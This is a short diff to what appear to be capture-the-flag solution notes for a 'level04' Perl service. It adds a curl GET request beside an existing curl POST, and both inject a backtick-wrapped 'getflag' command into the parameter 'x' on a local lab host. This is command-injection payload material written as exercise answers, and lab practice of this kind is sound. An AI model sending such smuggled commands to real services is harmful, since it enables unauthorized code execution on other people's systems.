@@ -1,2 +1,3 @@
 cat level04.pl
 Send a POST Request : curl -X POST -F 'x=`getflag`' http://192.168.99.106:4747
+OU curl -X GET "http://192.168.99.106:4747/?x=\`getflag\`"
